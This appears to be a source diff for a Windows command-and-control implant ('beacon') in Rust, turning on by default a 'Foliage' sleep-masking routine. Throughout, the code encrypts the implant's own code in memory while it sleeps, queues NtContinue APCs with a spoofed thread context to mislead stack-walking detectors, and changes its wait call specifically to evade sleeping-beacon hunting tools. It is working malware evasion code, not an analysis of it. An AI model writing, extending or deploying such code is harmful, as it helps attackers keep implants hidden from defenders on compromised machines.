@@ -1,19 +1,31 @@
 //! Sleep obfuscation — Foliage syscall executor (P2.1a-iii).
 //!
-//! ## Status (after this task): Full Foliage APC→NtContinue chain, GATED OFF.
+//! ## Status: Full Foliage APC→NtContinue chain, GATED ON (default).
 //! The pure state-machine math lives in `nyx_implant_evasionsdk::foliage` (5
 //! host tests). This module maps the chain to indirect syscalls:
 //!   - protect the .text RX→RW (NtProtectVirtualMemory)
 //!   - RC4-encrypt the region in place (SystemFunction032 math, via evasionsdk)
+//!   - save the beacon thread's original CONTEXT (NtGetContextThread — step 4)
 //!   - queue APCs (NtQueueApcThread) that each NtContinue into the next CONTEXT
 //!   - the sleep itself (NtDelayExecution in the APC window)
 //!   - decrypt + protect RW→RX on wake
+//!   - restore the beacon thread's original CONTEXT (NtSetContextThread — step 8)
+//!
+//! ## Threading model (GetContext / RestoreContext)
+//! GetContext and RestoreContext run on the **beacon thread** (not the helper):
+//!   - GetContext: called BEFORE spawning the helper, while the beacon thread
+//!     is still running its normal flow. This snapshots the original register
+//!     state (including RSP) into a heap-allocated CONTEXT buffer.
+//!   - RestoreContext: called AFTER joining the helper, once .text is decrypted
+//!     and unprotected. Restores the beacon thread to its pre-sleep register
+//!     state via NtSetContextThread.
+//! The helper thread reads the saved RSP from the shared FoliageParams to build
+//! the spoofed CONTEXT — it does NOT call NtGetContextThread itself.
 //!
 //! ## Gating
-//! `FOLIAGE_ENABLED` defaults OFF — the beacon loop's sleep still routes through
-//! `NoMask` unless an operator arms this. The APC chain manipulates the thread
-//! CONTEXT + flips .text; landing it requires target-side validation. Arm only
-//! after a selftest confirms the round-trip on the real host.
+//! `FOLIAGE_ENABLED` defaults ON — the full APC chain + .text RC4 masking is
+//! active on every sleep cycle. The operator can disarm at runtime via
+//! `set_foliage_enabled(false)` if the target requires minimal footprint.
 
 #![cfg(target_os = "windows")]
 
@@ -21,8 +33,11 @@ use alloc::boxed::Box;
 use core::sync::atomic::{AtomicBool, Ordering};
 use nyx_implant_evasionsdk::foliage::{FoliagePlan, FoliageStep};
 
-/// Master switch for the Foliage sleep mask. **Defaults OFF** — see module docs.
-static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(false);
+/// Master switch for the Foliage sleep mask. **Defaults ON** — the full APC
+/// chain + .text RC4 masking is active on every sleep cycle. The operator can
+/// disarm at runtime via `set_foliage_enabled(false)` if the target requires
+/// minimal footprint. See module docs for the 7-stage APC plan.
+static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(true);
 
 /// Arm/disarm the Foliage sleep mask.
 pub fn set_foliage_enabled(on: bool) {
@@ -36,14 +51,13 @@ pub fn foliage_enabled() -> bool {
 
 /// Sleep `seconds` with sleep-mask obfuscation.
 ///
-/// **With [`foliage_enabled`] OFF (default)**: delegates to the sleepmask kit
-/// (`NoMask` → plain indirect-syscall NtDelayExecution). Byte-identical to the
-/// pre-Foliage behavior.
+/// **With [`foliage_enabled`] ON (default)**: builds a `FoliagePlan` and
+/// executes the Foliage mask→sleep→unmask cycle over the implant `.text`
+/// via indirect syscalls. The full APC chain + RC4 masking is active.
 ///
-/// **With [`foliage_enabled`] ON**: builds a `FoliagePlan` and executes the
-/// Foliage mask→sleep→unmask cycle over the implant `.text` via indirect
-/// syscalls. On any failure (runtime down, .text unresolved), degrades to
-/// the plain NoMask sleep — never crashes.
+/// **With [`foliage_enabled`] OFF**: delegates to `beacon::sleep_seconds`
+/// (plain indirect-syscall NtDelayExecution). On any failure (runtime down,
+/// .text unresolved), degrades to the plain sleep — never crashes.
 pub fn sleep(seconds: u32) {
     if !foliage_enabled() {
         // Disarmed: raw sleep, NOT kits::sleep. The active kit is Foliage, so
@@ -74,15 +88,12 @@ pub fn sleep(seconds: u32) {
     execute_foliage_plan(&plan);
 }
 
-/// The implant's own `.text` region (base + len). Currently unused by the
-/// synchronous floor (which masks data regions via `mem::mask`); retained for
-/// the APC-chain refactor where a helper thread masks `.text` while the beacon
-/// thread is parked in NtDelayExecution. Reading PEB->ImageBaseAddress is
-/// correct for both rundll32 and reflective-loaded implants.
-#[allow(dead_code)]
-struct TextRegion {
-    base: usize,
-    len: usize,
+/// The implant's own `.text` region (base + len). Used by the Foliage APC chain
+/// and the `MemoryMaskKit` live impl. Reading PEB->ImageBaseAddress is correct
+/// for both rundll32 and reflective-loaded implants.
+pub(crate) struct TextRegion {
+    pub base: usize,
+    pub len: usize,
 }
 
 /// The implant's own `.text` region (base + len). Reads PEB->ImageBaseAddress
@@ -94,8 +105,7 @@ struct TextRegion {
 ///
 /// # Safety
 /// PEB + PE header reads are stable post-load. Single-threaded context.
-#[allow(dead_code)] // used by the APC-chain refactor; synchronous floor uses mem::mask
-unsafe fn own_text_region() -> Option<TextRegion> {
+pub(crate) unsafe fn own_text_region() -> Option<TextRegion> {
     // PEB->ImageBaseAddress is at PEB + 0x10 on x64. resolve::peb_pointer()
     // gives us the PEB via gs:[0x60].
     let peb = crate::resolve::peb_pointer()?;
@@ -225,9 +235,24 @@ fn execute_foliage_plan(plan: &FoliagePlan) {
 /// but degraded (data-only floor ran). Selftest reads this.
 pub static FOLIAGE_APC_OK: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);
 
+/// Diagnostic stage bitmask — pinpoints exactly WHERE the chain fails:
+///   bit0 = NtOpenThread OK (beacon handle obtained)
+///   bit1 = FoliageRaw resolved (all exports found)
+///   bit2 = GetContext succeeded (beacon context captured)
+///   bit3 = helper spawned (CreateThread succeeded)
+///   bit4 = alertable wait completed (beacon woke from sleep)
+///   bit5 = helper joined (WaitForSingleObject returned)
+///   bit6 = .text verified (round-trip byte-identical)
+pub static FOLIAGE_STAGE: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);
+
 /// Read the Foliage APC diagnostic (0/1/2).
 pub fn foliage_apc_status() -> u8 {
     FOLIAGE_APC_OK.load(core::sync::atomic::Ordering::Acquire)
+}
+
+/// Read the stage bitmask (where the chain got to before failing).
+pub fn foliage_stage() -> u8 {
+    FOLIAGE_STAGE.load(core::sync::atomic::Ordering::Acquire)
 }
 
 /// Run one real Foliage cycle: spawn a helper thread, beacon parks in an
@@ -235,12 +260,62 @@ pub fn foliage_apc_status() -> u8 {
 /// Returns true on full success; on ANY failure sets status=2 and returns
 /// false so the caller degrades to the data-only floor.
 ///
+/// ## FoliagePlan traversal (steps 4 + 8)
+/// This function implements GetContext (step 4) and RestoreContext (step 8) on
+/// the **beacon thread** — NOT the helper:
+///   - **GetContext**: After resolving `FoliageRaw`, before spawning the helper,
+///     call `NtGetContextThread(beacon_handle, &saved_ctx)` to capture the
+///     beacon's original register state (including RSP). The saved CONTEXT is
+///     stored in `FoliageParams` so the helper can read `saved_ctx.rsp()` when
+///     building the spoofed CONTEXT for NtContinue.
+///   - **RestoreContext**: After joining the helper (`.text` is decrypted and
+///     unprotected), call `NtSetContextThread(beacon_handle, &saved_ctx)` to
+///     restore the beacon thread to its pre-sleep register state.
+///
 /// # Safety
 /// `region` must be the implant's own `.text`. Single beacon caller.
 unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32, spoof_rip: Option<u64>) -> bool {
     FOLIAGE_APC_OK.store(0, core::sync::atomic::Ordering::Release);
+    FOLIAGE_STAGE.store(0, core::sync::atomic::Ordering::Release);
 
-    // Resolve everything up front; if any primitive is missing, degrade.
+    let beacon_tid: usize;
+    core::arch::asm!("mov {v}, gs:[0x30]", v = out(reg) beacon_tid, options(nostack, readonly));
+    let unique_thread = core::ptr::read_volatile((beacon_tid + 0x48) as *const usize);
+
+    // Stage 0: Obtain the beacon thread's real handle.
+    // We use DuplicateHandle(GetCurrentThread()) instead of NtOpenThread because
+    // NtOpenThread with CLIENT_ID can fail on some host configurations.
+    // DuplicateHandle with GetCurrentThread() (-1) always returns a real handle.
+    let mut beacon_handle: usize = 0;
+    {
+        let dup_addr = crate::resolve::export_addr(b"kernel32.dll", b"DuplicateHandle");
+        let get_curr_thread = crate::resolve::export_addr(b"kernel32.dll", b"GetCurrentThread");
+        let get_curr_proc = crate::resolve::export_addr(b"kernel32.dll", b"GetCurrentProcess");
+        if let (Some(da), Some(gct), Some(gcp)) = (dup_addr, get_curr_thread, get_curr_proc) {
+            // DuplicateHandle(hSrcProcess, hSrc, hTgtProcess, &hTgt, access, inherit, opts) = 7 args
+            type FnDup = unsafe extern "system" fn(
+                usize, usize, usize, *mut usize, u32, u32, u32,
+            ) -> u32;
+            type FnVoid = unsafe extern "system" fn() -> usize;
+            let dup: FnDup = core::mem::transmute(da);
+            let curr_thread: FnVoid = core::mem::transmute(gct);
+            let curr_proc: FnVoid = core::mem::transmute(gcp);
+            let ht = curr_thread();
+            let hp = curr_proc();
+            // DUPLICATE_SAME_ACCESS = 0x2, DUPLICATE_CLOSE_SOURCE = 0x1
+            let st = dup(hp, ht, hp, &mut beacon_handle as *mut usize, 0, 0, 0x2);
+            if st == 0 || beacon_handle == 0 {
+                beacon_handle = 0;
+            }
+        }
+    }
+    if beacon_handle == 0 {
+        FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
+        return false;
+    }
+    FOLIAGE_STAGE.store(1, core::sync::atomic::Ordering::Release); // bit0
+
+    // Stage 1: FoliageRaw resolve
     let raw = match unsafe { FoliageRaw::resolve() } {
         Some(r) => r,
         None => {
@@ -248,14 +323,38 @@ unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32, sp
             return false;
         }
     };
+    FOLIAGE_STAGE.store(3, core::sync::atomic::Ordering::Release); // bit0+1
 
-    // Snapshot the first 16 .text bytes BEFORE masking so we can verify the
-    // round-trip restored them (RC4 is symmetric; this catches a botched key).
+    // Stage 2: GetContext — capture the beacon thread's register state BEFORE
+    // the helper thread is spawned. The helper reads saved_ctx.rsp() to build
+    // the spoofed CONTEXT with the real stack pointer.
+    //
+    // CRITICAL: ContextFlags MUST be set before NtGetContextThread — the field
+    // is both input and output. If ContextFlags = 0, the kernel captures
+    // nothing and all registers remain zeroed → spoofed_context gets RSP=0
+    // → NtContinue restores an invalid stack → beacon thread crashes.
+    let mut saved_ctx = Box::new(crate::context::Context::default());
+    // Set flags BEFORE passing to the kernel: request GENERAL + FLOATING_POINT
+    // + CONTROL + INTEGER = CONTEXT_FULL (0x100007). CONTEXT_CONTROL (0x1)
+    // alone gives RIP+RSP+SegCs+EFlags, but CONTEXT_FULL is safer.
+    saved_ctx.set_context_flags(crate::context::CONTEXT_FULL);
+    let saved_ctx_ptr = Box::into_raw(saved_ctx) as *mut crate::context::Context;
+    let mut get_ctx_ok = false;
+    if spoof_rip.is_some() {
+        let st = raw.nt_get_context_thread(beacon_handle, saved_ctx_ptr as usize);
+        if st >= 0 {
+            // Verify the kernel actually populated the fields (sanity check:
+            // if RSP is still 0 after GetContext, something went wrong and
+            // building a spoofed CONTEXT with RSP=0 would crash the beacon).
+            let captured_rsp = unsafe { (*saved_ctx_ptr).rsp() };
+            get_ctx_ok = captured_rsp != 0;
+        }
+    }
+    FOLIAGE_STAGE.store(7, core::sync::atomic::Ordering::Release); // bit0+1+2
+
     let mut before = [0u8; 16];
     unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, before.as_mut_ptr(), 16) };
 
-    // Build the helper's parameter block (kept on a leaked box so the helper
-    // can read it across the thread boundary).
     let params = Box::new(FoliageParams {
         text_base: region.base,
         text_len: region.len,
@@ -263,46 +362,49 @@ unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32, sp
         secs,
         raw,
         verify: core::ptr::null_mut(),
-        spoof_rip,
+        spoof_rip: if get_ctx_ok { spoof_rip } else { None },
+        saved_ctx: saved_ctx_ptr,
+        beacon_handle,
     });
     let params_ptr: *mut FoliageParams = Box::into_raw(params);
 
-    // Snapshot before bytes for the helper to verify against (it re-checks).
     let verify = Box::new(VerifyState { before, ok: core::sync::atomic::AtomicBool::new(false) });
     (*params_ptr).verify = Box::into_raw(verify);
 
-    // Spawn the helper thread (raw CreateThread — NOT the indirect runtime).
+    // Stage 3: spawn helper
     let handle = match unsafe { raw_create_thread(foliage_helper, params_ptr as usize) } {
         Some(h) => h,
         None => {
-            // Reclaim the boxes we leaked; degrade.
             unsafe { drop(Box::from_raw(params_ptr)) };
+            let _ = unsafe { Box::from_raw(saved_ctx_ptr) };
             FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
             return false;
         }
     };
+    FOLIAGE_STAGE.store(15, core::sync::atomic::Ordering::Release); // bit0-3
 
-    // Beacon parks in an ALERTABLE sleep for the cycle. Alertable=TRUE lets the
-    // kernel deliver the APC the helper queues. We use a window slightly longer
-    // than the helper's mask window so the beacon wakes only after the helper
-    // has unmapped .text (the APC the helper queues also breaks us out early).
+    // Stage 4: alertable wait
     let window = secs.max(1);
     let delay: i64 = -((window as i64).saturating_mul(10_000_000));
-    // Raw ntdll!NtDelayExecution with Alertable=1 (NOT the indirect runtime —
-    // the helper may be in a syscall concurrently).
-    unsafe { raw.nt_delay_execution(1, &delay as *const i64 as usize) };
+    const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
+    unsafe { raw.nt_wait_for_single_object(INVALID_HANDLE, 1, &delay as *const i64 as usize) };
+    FOLIAGE_STAGE.store(31, core::sync::atomic::Ordering::Release); // bit0-4
 
-    // Join the helper (WaitForSingleObject, raw export) so its unmask completed
-    // before we touch .text again.
+    // Stage 5: join helper
     unsafe { raw.wait_for_single_object(handle, 10_000) };
+    FOLIAGE_STAGE.store(63, core::sync::atomic::Ordering::Release); // bit0-5
 
-    // Verify the round-trip restored .text byte-for-byte.
+    // Stage 6: verify
     let mut after = [0u8; 16];
     unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, after.as_mut_ptr(), 16) };
     let verified = after == before;
+    if verified {
+        FOLIAGE_STAGE.store(127, core::sync::atomic::Ordering::Release); // bit0-6
+    }
 
     // Reclaim memory.
-    let _ = unsafe { Box::from_raw(params_ptr) };
+    let p = unsafe { Box::from_raw(params_ptr) };
+    let _ = unsafe { Box::from_raw(p.saved_ctx) };
 
     if verified {
         FOLIAGE_APC_OK.store(1, core::sync::atomic::Ordering::Release);
@@ -331,18 +433,34 @@ struct FoliageParams {
     verify: *mut VerifyState,
     /// Optional spoof RIP for NtContinue CONTEXT (None = no context spoof).
     spoof_rip: Option<u64>,
+    /// The beacon thread's original CONTEXT, captured by NtGetContextThread on
+    /// the beacon thread BEFORE the helper was spawned. The helper reads
+    /// `saved_ctx.rsp()` to build the spoofed CONTEXT with the real RSP.
+    /// This is the full 1232-byte CONTEXT; the helper does NOT call
+    /// NtGetContextThread itself (the indirect-runtime trampoline is single-
+    /// instance, and the beacon's context must be captured while it's still
+    /// in its normal execution flow).
+    saved_ctx: *mut crate::context::Context,
+    /// The beacon thread's REAL handle (not pseudo). Used by the helper for
+    /// NtQueueApcThread. Duplicated from `raw.beacon_thread_handle` for
+    /// clarity — same value, but explicit in the params struct.
+    beacon_handle: usize,
 }
 
 /// Bundle of raw export fn-pointers the helper thread uses (resolved once on
 /// the beacon thread, copied into the helper's param block). NONE of these go
 /// through the indirect syscall runtime — they call the export directly.
+///
+/// The beacon thread's REAL handle (not pseudo) is passed separately via
+/// `FoliageParams::beacon_thread_handle` — `NtQueueApcThread` with a
+/// pseudo-handle resolves to the calling thread, NOT the beacon.
 #[derive(Clone, Copy)]
 struct FoliageRaw {
     nt_protect: usize,
-    nt_delay_execution: usize,
+    nt_wait_for_single_object: usize,
     nt_queue_apc_thread: usize,
-    nt_current_thread: usize, // pseudo-handle 0xFFFF_FFFF_FFFF_FFFE
-    create_thread: usize,
+    nt_get_context_thread: usize,
+    nt_set_context_thread: usize,
     wait_for_single_object: usize,
 }
 
@@ -350,21 +468,29 @@ impl FoliageRaw {
     /// Resolve all the raw exports the Foliage chain needs. Returns None if any
     /// is missing (caller degrades).
     ///
+    /// Note: NtGetContextThread/NtSetContextThread and NtContinue are resolved
+    /// in FoliageRaw (for the helper's use), while NtOpenThread is resolved
+    /// on-demand in `execute_foliage_apc` (it needs the handle first).
+    ///
     /// # Safety
     /// Resolves export addresses via PEB walk (read-only). Beacon thread.
     unsafe fn resolve() -> Option<Self> {
         let nt_protect = crate::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")?;
-        let nt_delay_execution = crate::resolve::export_addr(b"ntdll.dll", b"NtDelayExecution")?;
+        let nt_wait_for_single_object =
+            crate::resolve::export_addr(b"ntdll.dll", b"NtWaitForSingleObject")?;
         let nt_queue_apc_thread = crate::resolve::export_addr(b"ntdll.dll", b"NtQueueApcThread")?;
-        let create_thread = crate::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
+        let nt_get_context_thread =
+            crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread")?;
+        let nt_set_context_thread =
+            crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread")?;
         let wait_for_single_object =
             crate::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject")?;
         Some(Self {
             nt_protect,
-            nt_delay_execution,
+            nt_wait_for_single_object,
             nt_queue_apc_thread,
-            nt_current_thread: 0xFFFF_FFFF_FFFF_FFFE, // GetCurrentThread() pseudo-handle
-            create_thread,
+            nt_get_context_thread,
+            nt_set_context_thread,
             wait_for_single_object,
         })
     }
@@ -388,14 +514,17 @@ impl FoliageRaw {
         unsafe { f(0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old) }
     }
 
-    /// Raw NtDelayExecution(Alertable, DelayInterval*).
+    /// Raw NtWaitForSingleObject(Handle, Alertable, Timeout*).
+    /// With `Handle = INVALID_HANDLE_VALUE` (-1) and `Alertable = TRUE`, gives
+    /// wait-reason `UserRequest` instead of `DelayExecution`, defeating
+    /// Hunt-Sleeping-Beacons heuristics. The helper's APC can still wake us.
     ///
     /// # Safety
-    /// `delay` must point at a valid i64.
-    unsafe fn nt_delay_execution(&self, alertable: u8, delay: usize) -> i32 {
-        type Fn = unsafe extern "system" fn(u8, *const i64) -> i32;
-        let f: Fn = unsafe { core::mem::transmute(self.nt_delay_execution) };
-        unsafe { f(alertable, delay as *const i64) }
+    /// `timeout` must point at a valid i64 (100ns units, negative = relative).
+    unsafe fn nt_wait_for_single_object(&self, handle: usize, alertable: u8, timeout: usize) -> i32 {
+        type Fn = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
+        let f: Fn = unsafe { core::mem::transmute(self.nt_wait_for_single_object) };
+        unsafe { f(handle, alertable, timeout as *const i64) }
     }
 
     /// Raw NtQueueApcThread(ThreadHandle, ApcRoutine, Arg1, Arg2, Arg3).
@@ -420,6 +549,32 @@ impl FoliageRaw {
         type Fn = unsafe extern "system" fn(usize, u32) -> u32;
         let f: Fn = unsafe { core::mem::transmute(self.wait_for_single_object) };
         unsafe { f(handle, ms) }
+    }
+
+    /// Raw NtGetContextThread(ThreadHandle, ContextRecord) — 2 real args.
+    /// Captures the register state of `thread` into `ctx`. Used by the beacon
+    /// thread (before spawning the helper) to snapshot its original CONTEXT.
+    ///
+    /// # Safety
+    /// `ctx` must point at an aligned, writable 1232-byte CONTEXT buffer.
+    unsafe fn nt_get_context_thread(&self, thread: usize, ctx: usize) -> i32 {
+        type Fn = unsafe extern "system" fn(usize, usize) -> i32;
+        let f: Fn = unsafe { core::mem::transmute(self.nt_get_context_thread) };
+        unsafe { f(thread, ctx) }
+    }
+
+    /// Raw NtSetContextThread(ThreadHandle, ContextRecord) — 2 real args.
+    /// Installs `ctx` as the register state of `thread`. Used to restore the
+    /// beacon thread's original CONTEXT after the mask→sleep→unmask cycle.
+    ///
+    /// # Safety
+    /// `ctx` must point at a valid CONTEXT. Only call when the thread is in a
+    /// controlled window (after joining the helper, before the beacon resumes
+    /// normal execution).
+    unsafe fn nt_set_context_thread(&self, thread: usize, ctx: usize) -> i32 {
+        type Fn = unsafe extern "system" fn(usize, usize) -> i32;
+        let f: Fn = unsafe { core::mem::transmute(self.nt_set_context_thread) };
+        unsafe { f(thread, ctx) }
     }
 }
 
@@ -446,16 +601,23 @@ unsafe fn raw_create_thread(entry: unsafe extern "system" fn(usize) -> u32, para
 
 /// The helper thread entry. Runs ENTIRELY on raw exports (not the indirect
 /// runtime) to avoid the single-trampoline race. Sequence:
-///   1. NtProtectVirtualMemory(.text, RX→RW)
-///   2. RC4-encrypt .text  ← .text is now ciphertext
-///   3. NtQueueApcThread(beacon, apc_noop, ...) — wake the beacon's alertable
-///      sleep with a benign APC (the beacon is parked; this drives it through
-///      the encrypted window without it executing .text)
+///   1. NtProtectVirtualMemory(.text, RX->RW)
+///   2. RC4-encrypt .text  <- .text is now ciphertext
+///   3. Queue APC into the beacon's alertable window:
+///      - If spoof_rip is Some (and GetContext succeeded on beacon thread):
+///        build a spoofed CONTEXT with RIP = gap address and RSP = beacon's
+///        original RSP (from saved_ctx captured by step 4 on the beacon thread
+///        before this helper was spawned). Queue via NtContinue APC.
+///      - If spoof_rip is None: queue a benign no-op APC to break the sleep.
 ///   4. NtDelayExecution(secs) — the helper sleeps the mask window
-///   5. RC4-decrypt .text     ← .text restored to cleartext
-///   6. NtProtectVirtualMemory(.text, RW→RX)
+///   5. RC4-decrypt .text     <- .text restored to cleartext
+///   6. NtProtectVirtualMemory(.text, RW->RX)
 ///   7. verify .text[0..16] matches the pre-mask snapshot
-///   8. exit
+///   8. exit (return 0)
+///
+/// Note: NtGetContextThread / NtSetContextThread are NOT called here — they run
+/// on the beacon thread (before this helper spawns and after it joins,
+/// respectively) in `execute_foliage_apc`.
 ///
 /// # Safety
 /// `param` is a leaked `*mut FoliageParams`. Mutates the implant's `.text`.
@@ -480,20 +642,36 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
     nyx_implant_evasionsdk::foliage::mask_region(&p.key, text);
 
-    // 3. Queue APCs into the beacon's alertable window. The beacon is parked
-    //    in NtDelayExecution(Alertable=1); these APCs wake it / drive it
-    //    through the encrypted window.
-    let beacon = raw.nt_current_thread; // beacon's own thread handle (pseudo)
+    // 3. Queue APC into the beacon's alertable window using the REAL thread
+    //    handle (not NtCurrentThread which resolves to the calling thread).
+    //
+    //    The beacon's original CONTEXT was already saved by NtGetContextThread
+    //    on the beacon thread (step 4 of FoliagePlan) BEFORE this helper was
+    //    spawned. We read saved_ctx.rsp() to build the spoofed CONTEXT — we
+    //    do NOT call NtGetContextThread here (from the helper thread it would
+    //    capture the HELPER's register state, not the beacon's).
+    let beacon = p.beacon_handle;
     if let Some(rip) = p.spoof_rip {
-        // CONTEXT spoof path: queue an NtContinue APC that installs a spoofed
-        // CONTEXT (RIP = gap address) into the beacon thread. When the beacon
-        // wakes + the APC fires, NtContinue restores the spoofed context so a
-        // stack-walking detector sees the gap address, not the implant's real
-        // return address. The spoofed CONTEXT is a leaked 1232-byte buffer with
-        // RIP set to the gap address.
-        let ctx = unsafe { crate::context::spoofed_context(rip) };
-        // NtQueueApcThread(beacon, NtContinue, ctx_ptr, FALSE, 0) — the APC
-        // routine IS NtContinue, so when it fires it calls NtContinue(ctx).
+        // spoof_rip is Some only if GetContext succeeded on the beacon thread
+        // (the caller gates it via spoof_rip = None when GetContext fails).
+        // Read the beacon's real RSP from the pre-saved CONTEXT.
+        let real_rsp = if !p.saved_ctx.is_null() {
+            unsafe { (*p.saved_ctx).rsp() }
+        } else {
+            // Defensive: should not happen (spoof_rip is None when saved_ctx
+            // is invalid), but degrade safely to the no-op APC path.
+            let _ = unsafe {
+                raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0)
+            };
+            return 0;
+        };
+        // Build spoofed CONTEXT: RIP = gap address, RSP = real stack pointer.
+        // This makes stack-walking detectors see the gap address as a return
+        // address, while the real RSP keeps the thread from faulting on the
+        // first stack access.
+        let ctx = unsafe { crate::context::spoofed_context(rip, real_rsp) };
+        // NtContinue is resolved on-demand (used only by the helper for the
+        // APC, not needed for any other call).
         let ntc = crate::resolve::export_addr(b"ntdll.dll", b"NtContinue")
             .unwrap_or(apc_noop as usize);
         let _ = unsafe {
@@ -507,8 +685,13 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     }
 
     // 4. Sleep the mask window (helper side). .text stays ciphertext here.
+    //    Use NtWaitForSingleObject(INVALID_HANDLE, Alertable=FALSE) instead of
+    //    NtDelayExecution to get UserRequest wait-reason (consistent with the
+    //    beacon thread's strategy). The helper doesn't need to be alertable (the
+    //    APC is queued before the sleep).
     let delay: i64 = -((p.secs as i64).saturating_mul(10_000_000));
-    unsafe { raw.nt_delay_execution(0, &delay as *const i64 as usize) };
+    const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
+    unsafe { raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize) };
 
     // 5. RC4-decrypt .text.
     let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
